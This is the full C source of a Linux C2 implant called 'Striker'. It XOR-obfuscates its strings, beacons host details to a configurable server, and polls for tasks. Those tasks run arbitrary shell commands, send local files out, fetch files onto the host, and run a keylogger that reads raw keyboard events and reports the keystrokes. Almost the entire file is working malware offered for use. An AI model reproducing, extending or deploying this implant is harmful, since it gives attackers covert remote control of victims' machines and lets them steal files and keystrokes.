/**
 *------------------------------------
 * Striker C2 implant for linux hosts.
 *                  Author: Umar Abdul
 *------------------------------------
 */

#include "striker.h"

// Set to non-zero value for debug outputs.
#define STRIKER_DEBUG 1
// Max task result size in bytes
#define MAX_RES_SIZE (sizeof(char) * 102400)
// Max number of tasks to queue.
#define MAX_TASKS_QUEUE 100
// Max number of keystrokes to collect by the key logger
#define MAX_KEYSTROKES 50000

#define URL_SIZE (sizeof(char) * 256)
char BASE_URL[URL_SIZE] = "[STRIKER_URL]"; // A marker for the server URL.
char AUTH_KEY[sizeof(char) * 32] = "[STRIKER_AUTH_KEY]"; // A marker for the authentication key to use for connecting.
char OBFS_KEY[sizeof(char) * 20] = "[STRIKER_OBFS_KEY]"; // A marker for the key to use for obfuscating strings.


char *obfs_decode(char *str){

  unsigned char key = (unsigned char)atoi(OBFS_KEY);
  size_t len = strlen(str);
  unsigned char curr_key;
  for (int i = 0; i < len; i++){
    curr_key = key * (i + 1);
    while (curr_key == 0 || curr_key == 10 || (curr_key >= 32 && curr_key <= 126))
      curr_key += 47;
    str[i] = str[i] ^ curr_key;
    key = curr_key;
  }
  return str;
}

CURL *init_curl(const char *path, buffer *buff){
  
  CURL *curl = curl_easy_init();
  if (!curl){
    if (STRIKER_DEBUG){
      char error[] = "[OBFS_ENC][-] Error initializing curl!";
      fprintf(stderr, "%s\n", obfs_decode(error));
    }
    exit(EXIT_FAILURE);
  }
  char *url = malloc(URL_SIZE);
  snprintf(url, URL_SIZE, "%s%s", BASE_URL, path);
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, buff);
  return curl;
}

size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff){

  size_t chunk_size = size * nmemb;
  append_buffer(buff, chunk, chunk_size);
  return chunk_size; // This tells curl that we received all bytes.
}

size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo){
  return fwrite(chunk, size, nmemb, wfo);
}

cJSON *sysinfo(){

  char strs[][30] = {"[OBFS_ENC]USER", "[OBFS_ENC]linux", "[OBFS_ENC]user", "[OBFS_ENC]pid", "[OBFS_ENC]cwd", "[OBFS_ENC]os", "[OBFS_ENC]host"};
  for (int i = 0; i < 7; i++)
    obfs_decode(strs[i]);
  cJSON *info = cJSON_CreateObject();
  char *user = getenv(strs[0]);
  unsigned short pid = getpid();
  char *cwd = malloc(PATH_MAX);
  getcwd(cwd, PATH_MAX);
  char *host = malloc(100);
  gethostname(host, 99);
  cJSON_AddItemToObject(info, strs[2], cJSON_CreateString(user));
  cJSON_AddItemToObject(info, strs[3], cJSON_CreateNumber(pid));
  cJSON_AddItemToObject(info, strs[4], cJSON_CreateString(cwd));
  cJSON_AddItemToObject(info, strs[5], cJSON_CreateString(strs[1]));
  cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(host));
  free(cwd);
  free(host);
  return info;
}

short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff){

  CURL *curl = curl_easy_init();
  if (!curl)
    return 0;
  char strs[][20] = {"[OBFS_ENC]file", "[OBFS_ENC]filename"};
  for (int i = 0; i < 2; i++)
    obfs_decode(strs[i]);
  CURLcode res;
  curl_mime *form;
  curl_mimepart *field;
  buffer *body = create_buffer(0);
  curl_easy_setopt(curl, CURLOPT_URL, url);
  form = curl_mime_init(curl);
  field = curl_mime_addpart(form);
  curl_mime_name(field, strs[0]);
  curl_mime_filedata(field, filename);
  field = curl_mime_addpart(form);
  curl_mime_name(field, strs[1]);
  curl_mime_data(field, filename, CURL_ZERO_TERMINATED);
  curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
  res = curl_easy_perform(curl);
  free_buffer(body);
  curl_mime_free(form);
  curl_easy_cleanup(curl);
  if (res != CURLE_OK){
    buffer_strcpy(result_buff, curl_easy_strerror(res));
    return 0;
  }
  return 1;
}

short int download_file(char *url, FILE *wfo, buffer *result_buff){

  CURL *curl = curl_easy_init();
  if (!curl)
    return 0;
  CURLcode res;
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_downloader);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, wfo);
  res = curl_easy_perform(curl);
  if (res != CURLE_OK){
    buffer_strcpy(result_buff, curl_easy_strerror(res));
    return 0;
  }
  char msg[] = "[OBFS_ENC]File uploaded successfully!";
  buffer_strcpy(result_buff, obfs_decode(msg));
  return 1;
}

void *keymon(void *ptr){

  char strs[][100] = {"[OBFS_ENC]duration", "[OBFS_ENC]/dev/input/by-path/platform-i8042-serio-0-event-kbd", "[OBFS_ENC]Error opening keyboard file!", "[OBFS_ENC] No keys logged!", "[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]loggedKeys"};
  for (int i = 0; i < 7; i++)
    obfs_decode(strs[i]);
  task *tsk = (task *)ptr;
  cJSON *data = tsk->data;
  unsigned long duration = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
  unsigned char *keys = malloc(sizeof(unsigned char) * MAX_KEYSTROKES);
  size_t count = 0;
  cJSON *result;
  buffer *result_buff = create_buffer(0);
  int kb = open(strs[1], O_RDONLY);
  if (kb == -1){
    buffer_strcpy(result_buff, strs[2]);
    goto complete;
  }
  fd_set set;
  struct timeval timeout;
  struct input_event e;
  unsigned long end_time = ((unsigned long)time(NULL)) + duration;
  while (count < MAX_KEYSTROKES && ((unsigned long)time(NULL)) < end_time){
    timeout.tv_sec = 1;
    FD_ZERO(&set);
    FD_SET(kb, &set);
    int status = select(kb + 1, &set, NULL, NULL, &timeout);
    if (status == -1)
      break;
    if (status == 0)
      continue;
    read(kb, &e, sizeof(e));
    if (!(e.type == EV_KEY && e.value == 0))
      continue;
    keys[count] = e.code;
    count++;
  }
  close(kb);

  complete:
    result = cJSON_CreateObject();
    cJSON_AddItemToObject(result, strs[4], cJSON_CreateString(tsk->uid));
    if (count > 0){
      cJSON *keys_logged = cJSON_CreateArray();
      for (int i = 0; i < count; i++)
        cJSON_AddItemToArray(keys_logged, cJSON_CreateNumber(keys[i]));
      cJSON_AddItemToObject(result, strs[6], keys_logged);
    }else{
      char *res = buffer_to_string(result_buff);
      cJSON_AddItemToObject(result, strs[5], cJSON_CreateString(res));
    }
    tsk->result = result;
    tsk->completed = 1;
    free(keys);
    free_buffer(result_buff);
    pthread_exit(NULL);
}

task *parse_task(cJSON *json){

  char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]taskType", "[OBFS_ENC]data"};
  for (int i = 0; i < 3; i++)
    obfs_decode(strs[i]);
  task *t = malloc(sizeof(task));
  t->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[0]));
  t->type = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[1]));
  t->data = cJSON_GetObjectItemCaseSensitive(json, strs[2]);
  t->queued = 0;
  t->completed = 0;
  t->result = NULL;
  return t;
}

void execute_task(session *striker, task *tsk){

  if (STRIKER_DEBUG){
    char msg[] = "[OBFS_ENC][*] Executing task: %s\n";
    printf(obfs_decode(msg), tsk->uid);
  }
  cJSON *data = tsk->data;
  cJSON *result = cJSON_CreateObject();
  buffer *result_buff = create_buffer(0);
  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon"};
  for (int i = 0; i < 5; i++)
    obfs_decode(cmd_strs[i]);
  if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
    char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
    for (int i = 0; i < 2; i++)
      obfs_decode(strs[i]);
    char *cmd = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
    if (!cmd)
      goto complete;
    char *shell_cmd = malloc(sizeof(char) * 1024);
    snprintf(shell_cmd, sizeof(char) * 1024, strs[1], cmd);
    FILE *proc = popen(shell_cmd, "r");
    if (!proc){
      free(shell_cmd);
      goto complete;
    }
    const short chunk_size = 1024;
    char *tmp = malloc(sizeof(char) * chunk_size);
    while (result_buff->used < MAX_RES_SIZE){
      if (fgets(tmp, chunk_size, proc) == NULL)
        break;
      append_buffer(result_buff, tmp, strlen(tmp));
    }
    pclose(proc);
  }else if (!strcmp(tsk->type, cmd_strs[1])){ // Upload a file to the server.
    char strs[][40] = {"[OBFS_ENC]file", "[OBFS_ENC]Error opening file!", "[OBFS_ENC]%s/agent/upload/%s"};
    for (int i = 0; i < 3; i++)
      obfs_decode(strs[i]);
    char *filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
    FILE *rfo = fopen(filename, "r");
    if (!rfo){
      buffer_strcpy(result_buff, strs[1]);
      goto complete;
    }
    char *url = malloc(URL_SIZE);
    if (snprintf(url, URL_SIZE, strs[2], BASE_URL, striker->uid) < 0)
      abort();
    upload_file(url, filename, rfo, result_buff);
    fclose(rfo);
    free(url);
  }else if (!strcmp(tsk->type, cmd_strs[2])){ // Download a file from the server.
    char strs[][50] = {"[OBFS_ENC]fileID", "[OBFS_ENC]name", "[OBFS_ENC]%s/agent/download/%s", "[OBFS_ENC]%s%s"};
    for (int i = 0; i < 4; i++)
      obfs_decode(strs[i]);
    char *fileID = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
    char *name = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[1]));
    char *url = malloc(URL_SIZE);
    if (snprintf(url, URL_SIZE, strs[2], BASE_URL, fileID) < 0)
      abort();
    char *loc = malloc(PATH_MAX);
    if (snprintf(loc, PATH_MAX, strs[3], striker->write_dir, name) < 0)
      abort();
    FILE *wfo = fopen(loc, "w");
    if (wfo != NULL)
      download_file(url, wfo, result_buff);
    fclose(wfo);
    free(url);
    free(loc);
  }else if (!strcmp(tsk->type, cmd_strs[3])){ // Change write directory.
    char strs[][40] = {"[OBFS_ENC]dir", "[OBFS_ENC]Changed write directory!"};
    for (int i = 0; i < 2; i++)
      obfs_decode(strs[i]);
    char *dir = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
    int len = strlen(dir);
    if (dir[len - 1] != '/'){
      dir[len] = '/';
      dir[len + 1] = '\0';
    }
    strncpy(striker->write_dir, dir, PATH_MAX);
    buffer_strcpy(result_buff, strs[1]);
  }else if (!strcmp(tsk->type, cmd_strs[4])){ // Start a keylogger.
    char msg[] = "[OBFS_ENC]Error starting keymon thread!";
    obfs_decode(msg);
    pthread_t t;
    int err = pthread_create(&t, NULL, keymon, (void *)tsk);
    if (err)
      buffer_strcpy(result_buff, msg);
    tsk->queued = 1;
  }else{
    char msg[] = "[OBFS_ENC]Not implemented!";
    buffer_strcpy(result_buff, obfs_decode(msg));
  }

  char strs[][40] = {"[OBFS_ENC][+] Task completed: %s\n", "[OBFS_ENC]uid", "[OBFS_ENC]result"};

  complete:
    for (int i = 0; i < 3; i++)
      obfs_decode(strs[i]);
    if (!tsk->queued){    
      if (STRIKER_DEBUG)
        printf(strs[0], tsk->uid);    
      char *res = buffer_to_string(result_buff);
      cJSON_AddItemToObject(result, strs[1], cJSON_CreateString(tsk->uid));
      cJSON_AddItemToObject(result, strs[2], cJSON_CreateString(res));
      tsk->result = result;
      tsk->completed = 1;
    }
    free_buffer(result_buff);
}

void start_session(){  
  
  // Decode some config.
  obfs_decode(BASE_URL);

  char strs[][50] = {
    "[OBFS_ENC]/tmp", "[OBFS_ENC]Connection: close", "[OBFS_ENC]Content-Type: application/json",
    "[OBFS_ENC]/agent/init", "[OBFS_ENC][-] Error calling home: %s\n",
    "[OBFS_ENC][-] Error parsing config: %s\n", "[OBFS_ENC]uid", "[OBFS_ENC]delay",
    "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC][+] Task results: %s\n", "[OBFS_ENC][+] Queued task completed: %s\n"};
  for (int i = 0; i < 11; i++)
    obfs_decode(strs[i]);
  // Default session setup.
  session *striker = malloc(sizeof(session));
  striker->uid = malloc(sizeof(char) * 32);
  striker->delay = 5;
  striker->write_dir = malloc(PATH_MAX);
  strncpy(striker->write_dir, strs[0], PATH_MAX);

  CURL *curl;
  CURLcode res;
  // Build the common headers that will be used for GET and POST requests.
  struct curl_slist *get_headers = NULL, *post_headers = NULL;
  get_headers = curl_slist_append(get_headers, strs[1]);
  post_headers = curl_slist_append(post_headers, strs[1]);
  post_headers = curl_slist_append(post_headers, strs[2]);
  buffer *body = create_buffer(0); // Dynamic buffer for receiving response body.
  
  while (1){ // Initiation loop.
    curl = init_curl(strs[3], body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cJSON_PrintUnformatted(sysinfo()));
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    if (res != CURLE_OK){
      if (STRIKER_DEBUG)
        fprintf(stderr, strs[4], curl_easy_strerror(res));
      sleep(striker->delay);
      continue;
    }
    break;
  }

  cJSON *config = cJSON_Parse(buffer_to_string(body));
  if (!config){
    if (STRIKER_DEBUG){
      const char *error = cJSON_GetErrorPtr();
      fprintf(stderr, strs[5], error);
    }
    goto end;
  }
  striker->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, strs[6]));
  striker->delay = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(config, strs[7]));
  char *tasksURL = malloc(URL_SIZE);
  snprintf(tasksURL, URL_SIZE, strs[8], striker->uid);
  queue *tasks_queue = queue_init(MAX_TASKS_QUEUE);
  if (STRIKER_DEBUG)
    printf("%s\n", cJSON_PrintUnformatted(config));
  while (1){
    resize_buffer(body, 0);
    sleep(striker->delay);
    // Fetch tasks.
    curl = init_curl(tasksURL, body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_headers);
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    if (res != CURLE_OK){
      if (STRIKER_DEBUG)
        fprintf(stderr, strs[4], curl_easy_strerror(res));
      continue;
    }
    // Parse and execute the tasks.
    cJSON *tasksJSON = cJSON_Parse(buffer_to_string(body));
    size_t tasksLen = cJSON_GetArraySize(tasksJSON);
    cJSON *results = cJSON_CreateArray();
    for (int i = 0; i < tasksLen; i++){
      task *tsk = parse_task(cJSON_GetArrayItem(tasksJSON, i));
      if (!tsk)
        continue;
      execute_task(striker, tsk);
      if (tsk->completed && tsk->result != NULL){ // The tasks has been completed.
        cJSON_AddItemToArray(results, tsk->result);
      }else if(tsk->queued && (!queue_full(tasks_queue))){ // Task has been queued.
        queue_put(tasks_queue, tsk);
      }
    }
    // Check if queued tasks are completed.
    queue_seek(tasks_queue, 0);
    for (int i = 0; !queue_exhausted(tasks_queue); i++){
      task *tsk = queue_get(tasks_queue);
      if (tsk->completed){
        if (STRIKER_DEBUG)
          printf(strs[10], tsk->uid);
        queue_remove(tasks_queue, i);
        cJSON_AddItemToArray(results, tsk->result);
        i--;
      }
    }
    // Send results.
    if (cJSON_GetArraySize(results) > 0){
      char *result = cJSON_PrintUnformatted(results);
      if (STRIKER_DEBUG)
        printf(strs[9], result);
      while (1){
        resize_buffer(body, 0);
        curl = init_curl(tasksURL, body);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, result);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        if (res != CURLE_OK){
          if (STRIKER_DEBUG)
            fprintf(stderr, strs[4], curl_easy_strerror(res));
          sleep(striker->delay);
          continue;
        }
        break;
      }
    }
    // Cleanup.
    cJSON_Delete(results);
    // cJSON_Delete(tasksJSON);
  }

  free(tasksURL);

  end:
    curl_slist_free_all(get_headers);
    curl_slist_free_all(post_headers);
    free_buffer(body);
    cleanup_session(striker);
}

void cleanup_session(session *striker){

  free(striker->uid);
  free(striker->write_dir);
  free(striker);
}

int main(int argc, char **argv){
  
  start_session();
  return 0;  
}
